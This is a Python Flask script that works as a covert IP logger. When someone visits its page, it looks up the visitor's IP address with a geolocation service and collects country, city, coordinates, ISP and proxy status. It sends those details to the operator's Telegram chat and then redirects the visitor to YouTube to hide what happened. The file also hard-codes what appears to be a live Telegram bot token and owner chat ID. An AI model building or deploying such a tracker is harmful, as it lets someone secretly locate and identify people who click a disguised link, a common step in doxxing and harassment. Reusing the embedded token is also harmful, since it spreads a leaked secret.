from flask import Flask, request, redirect
import requests
from datetime import datetime

REDIRECT = "https://youtube.com/"
BOT_API = "8574482325:AAFWuKbyippPqdDbYO-S4cb61TeoPiQwriE"
OWNER_ID = "1287226839"

app = Flask(__name__)

@app.route("/")
def main():
    print("\n--- Visitor hit ---")

    # Get visitor IP
    headers_list = request.headers.getlist("X-Forwarded-For")
    user_ip = headers_list[0] if headers_list else request.remote_addr
    print("Visitor IP:", user_ip)

    # Call IP-API
    try:
        resp = requests.get(
            f"http://ip-api.com/json/{user_ip}?fields=status,message,continent,continentCode,"
            "country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,"
            "offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query",
            timeout=5
        )
        info = resp.json()
    except Exception as e:
        info = {"query": user_ip, "country": "Unknown", "city": "Unknown", "isp": "Unknown"}
        print("IP-API error:", e)

    # Format visitor info
    visitor_info = f"""
🥳 New visitor! 🥳
Time: {datetime.now()}
IP: {info.get('query')}
Status: {info.get('status')}
Continent: {info.get('continent')} ({info.get('continentCode')})
Country: {info.get('country')} ({info.get('countryCode')})
Region: {info.get('regionName')} ({info.get('region')})
City: {info.get('city')}
District: {info.get('district')}
Zip: {info.get('zip')}
Latitude/Longitude: {info.get('lat')}, {info.get('lon')}
Timezone: {info.get('timezone')} (Offset {info.get('offset')})
Currency: {info.get('currency')}
ISP: {info.get('isp')}
Org: {info.get('org')}
AS: {info.get('as')} ({info.get('asname')})
Reverse DNS: {info.get('reverse')}
Mobile: {info.get('mobile')}
Proxy: {info.get('proxy')}
Hosting: {info.get('hosting')}
"""

    # Print in terminal
    print(visitor_info)

    # Send Telegram message
    if user_ip != "127.0.0.1":
        try:
            resp = requests.get(
                f"https://api.telegram.org/bot{BOT_API}/sendMessage",
                params={"chat_id": OWNER_ID, "text": visitor_info}
            )
            print("Telegram response:", resp.json())
        except Exception as e:
            print("Error sending Telegram message:", e)

    # Optional redirect
    if REDIRECT:
        return redirect(REDIRECT)
    return "Visitor info logged locally. Check terminal and Telegram."

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000, debug=True)
